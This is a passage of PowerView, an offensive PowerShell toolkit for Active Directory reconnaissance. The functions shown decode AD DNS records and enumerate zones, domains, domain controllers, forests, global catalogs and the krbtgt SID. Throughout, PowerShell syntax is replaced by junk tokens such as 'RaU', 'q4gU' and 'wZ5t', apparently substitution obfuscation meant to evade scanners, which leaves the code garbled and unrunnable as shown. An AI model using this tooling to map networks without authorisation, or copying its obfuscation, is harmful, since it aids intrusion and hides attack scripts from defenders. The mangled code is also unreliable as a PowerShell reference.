Author: Michael B. Smith, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Decodes a binary blob representing an Active Directory DNS entry.
Used by Get-DomainDNSRecord.

Adapted/ported from Michael B. Smithq4gUs code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1

.PARAMETER DNSRecord

A byte array representing the DNS record.

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs custom PSObjects with detailed information about the DNS record entry.

.LINK

https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
#>

    [OutputType(q4gUSystem.Management.Automation.PSCustomObjectq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Byte[]]
        RaUDNSRecord
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseOutputTypeCorrectlyq4gU, q4gUq4gU)]
            [CmdletBinding()]
            Param(
                [Byte[]]
                RaURaw
            )

            [Int]RaULength = RaURaw[0]
            [Int]RaUSegments = RaURaw[1]
            [Int]RaUIndex =  2
            [String]RaUName  = q4gUq4gU

            while (RaUSegments-- -gt 0)
            {
                [Int]RaUSegmentLength = RaURaw[RaUIndex++]
                while (RaUSegmentLength-- -gt 0) {
                    RaUName += [Char]RaURaw[RaUIndex++]
                }
                RaUName += Oj8X.Oj8X
            }
            RaUName
        }
    }

    PROCESS {
        # RaURDataLen = [BitConverter]::ToUInt16(RaUDNSRecord, 0)
        RaURDataType = [BitConverter]::ToUInt16(RaUDNSRecord, 2)
        RaUUpdatedAtSerial = [BitConverter]::ToUInt32(RaUDNSRecord, 8)

        RaUTTLRaw = RaUDNSRecord[12..15]

        # reverse for big endian
        RaUNull = [array]::Reverse(RaUTTLRaw)
        RaUTTL = [BitConverter]::ToUInt32(RaUTTLRaw, 0)

        RaUAge = [BitConverter]::ToUInt32(RaUDNSRecord, 20)
        if (RaUAge -ne 0) {
            RaUTimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours(RaUage)).ToString()
        }
        else {
            RaUTimeStamp = q4gU[static]q4gU
        }

        RaUDNSRecordObject = New-Object PSObject

        if (RaURDataType -eq 1) {
            RaUIP = Oj8X{0}.{1}.{2}.{3}Oj8X -f RaUDNSRecord[24], RaUDNSRecord[25], RaUDNSRecord[26], RaUDNSRecord[27]
            RaUData = RaUIP
            RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gURecordTypeq4gU q4gUAq4gU
        }

        elseif (RaURDataType -eq 2) {
            RaUNSName = Get-Name RaUDNSRecord[24..RaUDNSRecord.length]
            RaUData = RaUNSName
            RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gURecordTypeq4gU q4gUNSq4gU
        }

        elseif (RaURDataType -eq 5) {
            RaUAlias = Get-Name RaUDNSRecord[24..RaUDNSRecord.length]
            RaUData = RaUAlias
            RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gURecordTypeq4gU q4gUCNAMEq4gU
        }

        elseif (RaURDataType -eq 6) {
            # TODO: how to implement properly? nested object?
            RaUData = RaU([System.Convert]::ToBase64String(RaUDNSRecord[24..RaUDNSRecord.length]))
            RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gURecordTypeq4gU q4gUSOAq4gU
        }

        elseif (RaURDataType -eq 12) {
            RaUPtr = Get-Name RaUDNSRecord[24..RaUDNSRecord.length]
            RaUData = RaUPtr
            RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gURecordTypeq4gU q4gUPTRq4gU
        }

        elseif (RaURDataType -eq 13) {
            # TODO: how to implement properly? nested object?
            RaUData = RaU([System.Convert]::ToBase64String(RaUDNSRecord[24..RaUDNSRecord.length]))
            RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gURecordTypeq4gU q4gUHINFOq4gU
        }

        elseif (RaURDataType -eq 15) {
            # TODO: how to implement properly? nested object?
            RaUData = RaU([System.Convert]::ToBase64String(RaUDNSRecord[24..RaUDNSRecord.length]))
            RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gURecordTypeq4gU q4gUMXq4gU
        }

        elseif (RaURDataType -eq 16) {
            [string]RaUTXT  = q4gUq4gU
            [int]RaUSegmentLength = RaUDNSRecord[24]
            RaUIndex = 25

            while (RaUSegmentLength-- -gt 0) {
                RaUTXT += [char]RaUDNSRecord[RaUindex++]
            }

            RaUData = RaUTXT
            RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gURecordTypeq4gU q4gUTXTq4gU
        }

        elseif (RaURDataType -eq 28) {
            # TODO: how to implement properly? nested object?
            RaUData = RaU([System.Convert]::ToBase64String(RaUDNSRecord[24..RaUDNSRecord.length]))
            RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gURecordTypeq4gU q4gUAAAAq4gU
        }

        elseif (RaURDataType -eq 33) {
            # TODO: how to implement properly? nested object?
            RaUData = RaU([System.Convert]::ToBase64String(RaUDNSRecord[24..RaUDNSRecord.length]))
            RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gURecordTypeq4gU q4gUSRVq4gU
        }

        else {
            RaUData = RaU([System.Convert]::ToBase64String(RaUDNSRecord[24..RaUDNSRecord.length]))
            RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gURecordTypeq4gU q4gUUNKNOWNq4gU
        }

        RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gUUpdatedAtSerialq4gU RaUUpdatedAtSerial
        RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gUTTLq4gU RaUTTL
        RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gUAgeq4gU RaUAge
        RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gUTimeStampq4gU RaUTimeStamp
        RaUDNSRecordObject wZ5t Add-Member Noteproperty q4gUDataq4gU RaUData
        RaUDNSRecordObject
    }
}


function Get-DomainDNSZone {
<#
.SYNOPSIS

Enumerates the Active Directory DNS zones for a given domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.PARAMETER Domain

The domain to query for zones, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDNSZone

Retrieves the DNS zones for the current domain.

.EXAMPLE

Get-DomainDNSZone -Domain dev.testlab.local -Server primary.testlab.local

Retrieves the DNS zones for the dev.testlab.local domain, binding to primary.testlab.local.

.OUTPUTS

PowerView.DNSZone

Outputs custom PSObjects with detailed information about the DNS zone.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.DNSZoneq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Alias(q4gUReturnOneq4gU)]
        [Switch]
        RaUFindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        RaUSearcherArguments = @{
            q4gULDAPFilterq4gU = q4gU(objectClass=dnsZone)q4gU
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUDNSSearcher1 = Get-DomainSearcher @SearcherArguments

        if (RaUDNSSearcher1) {
            if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUDNSSearcher1.FindOne()  }
            else { RaUResults = RaUDNSSearcher1.FindAll() }
            RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUOut = Convert-LDAPProperty -Properties RaU_.Properties
                RaUOut wZ5t Add-Member NoteProperty q4gUZoneNameq4gU RaUOut.name
                RaUOut.PSObject.TypeNames.Insert(0, q4gUPowerView.DNSZoneq4gU)
                RaUOut
            }

            if (RaUResults) {
                try { RaUResults.dispose() }
                catch {
                    Write-Verbose Oj8X[Get-DomainDFSShare] Error disposing of the Results object: RaU_Oj8X
                }
            }
            RaUDNSSearcher1.dispose()
        }

        RaUSearcherArguments[q4gUSearchBasePrefixq4gU] = q4gUCN=MicrosoftDNS,DC=DomainDnsZonesq4gU
        RaUDNSSearcher2 = Get-DomainSearcher @SearcherArguments

        if (RaUDNSSearcher2) {
            try {
                if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUDNSSearcher2.FindOne() }
                else { RaUResults = RaUDNSSearcher2.FindAll() }
                RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                    RaUOut = Convert-LDAPProperty -Properties RaU_.Properties
                    RaUOut wZ5t Add-Member NoteProperty q4gUZoneNameq4gU RaUOut.name
                    RaUOut.PSObject.TypeNames.Insert(0, q4gUPowerView.DNSZoneq4gU)
                    RaUOut
                }
                if (RaUResults) {
                    try { RaUResults.dispose() }
                    catch {
                        Write-Verbose Oj8X[Get-DomainDNSZone] Error disposing of the Results object: RaU_Oj8X
                    }
                }
            }
            catch {
                Write-Verbose Oj8X[Get-DomainDNSZone] Error accessing q4gUCN=MicrosoftDNS,DC=DomainDnsZonesq4gUOj8X
            }
            RaUDNSSearcher2.dispose()
        }
    }
}


function Get-DomainDNSRecord {
<#
.SYNOPSIS

Enumerates the Active Directory DNS records for a given zone.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-DNSRecord  

.DESCRIPTION

Given a specific Active Directory DNS zone name, query for all q4gUdnsNodeq4gU
LDAP entries using that zone as the search base. Return all DNS entry results
and use Convert-DNSRecord to try to convert the binary DNS record blobs.

.PARAMETER ZoneName

Specifies the zone to query for records (which can be enumearted with Get-DomainDNSZone).

.PARAMETER Domain

The domain to query for zones, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDNSRecord -ZoneName testlab.local

Retrieve all records for the testlab.local zone.

.EXAMPLE

Get-DomainDNSZone wZ5t Get-DomainDNSRecord

Retrieve all records for all zones in the current domain.

.EXAMPLE

Get-DomainDNSZone -Domain dev.testlab.local wZ5t Get-DomainDNSRecord -Domain dev.testlab.local

Retrieve all records for all zones in the dev.testlab.local domain.

.OUTPUTS

PowerView.DNSRecord

Outputs custom PSObjects with detailed information about the DNS record entry.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.DNSRecordq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUZoneName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties = q4gUname,distinguishedname,dnsrecord,whencreated,whenchangedq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Alias(q4gUReturnOneq4gU)]
        [Switch]
        RaUFindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        RaUSearcherArguments = @{
            q4gULDAPFilterq4gU = q4gU(objectClass=dnsNode)q4gU
            q4gUSearchBasePrefixq4gU = Oj8XDC=RaU(RaUZoneName),CN=MicrosoftDNS,DC=DomainDnsZonesOj8X
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUDNSSearcher = Get-DomainSearcher @SearcherArguments

        if (RaUDNSSearcher) {
            if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUDNSSearcher.FindOne() }
            else { RaUResults = RaUDNSSearcher.FindAll() }
            RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                try {
                    RaUOut = Convert-LDAPProperty -Properties RaU_.Properties wZ5t Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    RaUOut wZ5t Add-Member NoteProperty q4gUZoneNameq4gU RaUZoneName

                    # convert the record and extract the properties
                    if (RaUOut.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        # TODO: handle multiple nested records properly?
                        RaURecord = Convert-DNSRecord -DNSRecord RaUOut.dnsrecord[0]
                    }
                    else {
                        RaURecord = Convert-DNSRecord -DNSRecord RaUOut.dnsrecord
                    }

                    if (RaURecord) {
                        RaURecord.PSObject.Properties wZ5t ForEach-Object {
                            RaUOut wZ5t Add-Member NoteProperty RaU_.Name RaU_.Value
                        }
                    }

                    RaUOut.PSObject.TypeNames.Insert(0, q4gUPowerView.DNSRecordq4gU)
                    RaUOut
                }
                catch {
                    Write-Warning Oj8X[Get-DomainDNSRecord] Error: RaU_Oj8X
                    RaUOut
                }
            }

            if (RaUResults) {
                try { RaUResults.dispose() }
                catch {
                    Write-Verbose Oj8X[Get-DomainDNSRecord] Error disposing of the Results object: RaU_Oj8X
                }
            }
            RaUDNSSearcher.dispose()
        }
    }
}


function Get-Domain {
<#
.SYNOPSIS

Returns the domain object for the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
domain or the domain specified with -Domain X.

.PARAMETER Domain

Specifies the domain name to query for, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-Domain -Domain testlab.local

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-Domain -Credential RaUCred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain

A complex .NET domain object.

.LINK

http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {

            Write-Verbose q4gU[Get-Domain] Using alternate credentials for Get-Domainq4gU

            if (RaUPSBoundParameters[q4gUDomainq4gU]) {
                RaUTargetDomain = RaUDomain
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                RaUTargetDomain = RaUCredential.GetNetworkCredential().Domain
                Write-Verbose Oj8X[Get-Domain] Extracted domain q4gURaUTargetDomainq4gU from -CredentialOj8X
            }

            RaUDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(q4gUDomainq4gU, RaUTargetDomain, RaUCredential.UserName, RaUCredential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(RaUDomainContext)
            }
            catch {
                Write-Verbose Oj8X[Get-Domain] The specified domain q4gURaUTargetDomainq4gU does not exist, could not be contacted, there isnq4gUt an existing trust, or the specified credentials are invalid: RaU_Oj8X
            }
        }
        elseif (RaUPSBoundParameters[q4gUDomainq4gU]) {
            RaUDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(q4gUDomainq4gU, RaUDomain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(RaUDomainContext)
            }
            catch {
                Write-Verbose Oj8X[Get-Domain] The specified domain q4gURaUDomainq4gU does not exist, could not be contacted, or there isnq4gUt an existing trust : RaU_Oj8X
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose Oj8X[Get-Domain] Error retrieving the current domain: RaU_Oj8X
            }
        }
    }
}


function Get-DomainController {
<#
.SYNOPSIS

Return the domain controllers for the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-Domain  

.DESCRIPTION

Enumerates the domain controllers for the current or specified domain.
By default built in .NET methods are used. The -LDAP switch uses Get-DomainComputer
to search for domain controllers.

.PARAMETER Domain

The domain to query for domain controllers, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER LDAP

Switch. Use LDAP queries to determine the domain controllers instead of built in .NET methods.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainController -Domain q4gUtest.localq4gU

Determine the domain controllers for q4gUtest.localq4gU.

.EXAMPLE

Get-DomainController -Domain q4gUtest.localq4gU -LDAP

Determine the domain controllers for q4gUtest.localq4gU using LDAP queries.

.EXAMPLE

q4gUtest.localq4gU wZ5t Get-DomainController

Determine the domain controllers for q4gUtest.localq4gU.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainController -Credential RaUCred

.OUTPUTS

PowerView.Computer

Outputs custom PSObjects with details about the enumerated domain controller if -LDAP is specified.

System.DirectoryServices.ActiveDirectory.DomainController

If -LDAP isnq4gUt specified.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.Computerq4gU)]
    [OutputType(q4gUSystem.DirectoryServices.ActiveDirectory.DomainControllerq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue)]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [Switch]
        RaULDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        RaUArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUArguments[q4gUCredentialq4gU] = RaUCredential }

        if (RaUPSBoundParameters[q4gULDAPq4gU] -or RaUPSBoundParameters[q4gUServerq4gU]) {
            if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUArguments[q4gUServerq4gU] = RaUServer }

            # UAC specification for domain controllers
            RaUArguments[q4gULDAPFilterq4gU] = q4gU(userAccountControl:1.2.840.113556.1.4.803:=8192)q4gU

            Get-DomainComputer @Arguments
        }
        else {
            RaUFoundDomain = Get-Domain @Arguments
            if (RaUFoundDomain) {
                RaUFoundDomain.DomainControllers
            }
        }
    }
}


function Get-Forest {
<#
.SYNOPSIS

Returns the forest object for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertTo-SID  

.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Forest object for the current
forest or the forest specified with -Forest X.

.PARAMETER Forest

The forest name to query for, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target forest.

.EXAMPLE

Get-Forest -Forest external.domain

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-Forest -Credential RaUCred

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs a PSObject containing System.DirectoryServices.ActiveDirectory.Forest in addition
to the forest root domain SID.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUSystem.Management.Automation.PSCustomObjectq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUForest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {

            Write-Verbose Oj8X[Get-Forest] Using alternate credentials for Get-ForestOj8X

            if (RaUPSBoundParameters[q4gUForestq4gU]) {
                RaUTargetForest = RaUForest
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                RaUTargetForest = RaUCredential.GetNetworkCredential().Domain
                Write-Verbose Oj8X[Get-Forest] Extracted domain q4gURaUForestq4gU from -CredentialOj8X
            }

            RaUForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(q4gUForestq4gU, RaUTargetForest, RaUCredential.UserName, RaUCredential.GetNetworkCredential().Password)

            try {
                RaUForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(RaUForestContext)
            }
            catch {
                Write-Verbose Oj8X[Get-Forest] The specified forest q4gURaUTargetForestq4gU does not exist, could not be contacted, there isnq4gUt an existing trust, or the specified credentials are invalid: RaU_Oj8X
                RaUNull
            }
        }
        elseif (RaUPSBoundParameters[q4gUForestq4gU]) {
            RaUForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(q4gUForestq4gU, RaUForest)
            try {
                RaUForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(RaUForestContext)
            }
            catch {
                Write-Verbose Oj8X[Get-Forest] The specified forest q4gURaUForestq4gU does not exist, could not be contacted, or there isnq4gUt an existing trust: RaU_Oj8X
                return RaUNull
            }
        }
        else {
            # otherwise use the current forest
            RaUForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if (RaUForestObject) {
            # get the SID of the forest root
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
                RaUForestSid = (Get-DomainUser -Identity Oj8XkrbtgtOj8X -Domain RaUForestObject.RootDomain.Name -Credential RaUCredential).objectsid
            }
            else {
                RaUForestSid = (Get-DomainUser -Identity Oj8XkrbtgtOj8X -Domain RaUForestObject.RootDomain.Name).objectsid
            }

            RaUParts = RaUForestSid -Split q4gU-q4gU
            RaUForestSid = RaUParts[0..RaU(RaUParts.length-2)] -join q4gU-q4gU
            RaUForestObject wZ5t Add-Member NoteProperty q4gURootDomainSidq4gU RaUForestSid
            RaUForestObject
        }
    }
}


function Get-ForestDomain {
<#
.SYNOPSIS

Return all domains for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Returns all domains for the current forest or the forest specified
by -Forest X.

.PARAMETER Forest

Specifies the forest name to query for domains.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target forest.

.EXAMPLE

Get-ForestDomain

.EXAMPLE

Get-ForestDomain -Forest external.local

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-ForestDomain -Credential RaUCred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUSystem.DirectoryServices.ActiveDirectory.Domainq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUForest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        RaUArguments = @{}
        if (RaUPSBoundParameters[q4gUForestq4gU]) { RaUArguments[q4gUForestq4gU] = RaUForest }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUForestObject = Get-Forest @Arguments
        if (RaUForestObject) {
            RaUForestObject.Domains
        }
    }
}


function Get-ForestGlobalCatalog {
<#
.SYNOPSIS

Return all global catalogs for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Returns all global catalogs for the current forest or the forest specified
by -Forest X by using Get-Forest to retrieve the specified forest object
and the .FindAllGlobalCatalogs() to enumerate the global catalogs.

.PARAMETER Forest

Specifies the forest name to query for global catalogs.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestGlobalCatalog

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-ForestGlobalCatalog -Credential RaUCred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.GlobalCatalog
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUSystem.DirectoryServices.ActiveDirectory.GlobalCatalogq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUForest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        RaUArguments = @{}
        if (RaUPSBoundParameters[q4gUForestq4gU]) { RaUArguments[q4gUForestq4gU] = RaUForest }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUForestObject = Get-Forest @Arguments

        if (RaUForestObject) {
            RaUForestObject.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {
<#
.SYNOPSIS

Helper that returns the Active Directory schema classes for the current
(or specified) forest or returns just the schema class specified by
-ClassName X.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Uses Get-Forest to retrieve the current (or specified) forest. By default,
the .FindAllClasses() method is executed, returning a collection of
[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass] results.
If Oj8X-FindClass XOj8X is specified, the [DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]
result for the specified class name is returned.

.PARAMETER ClassName

Specifies a ActiveDirectorySchemaClass name in the found schema to return.

.PARAMETER Forest

The forest to query for the schema, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestSchemaClass

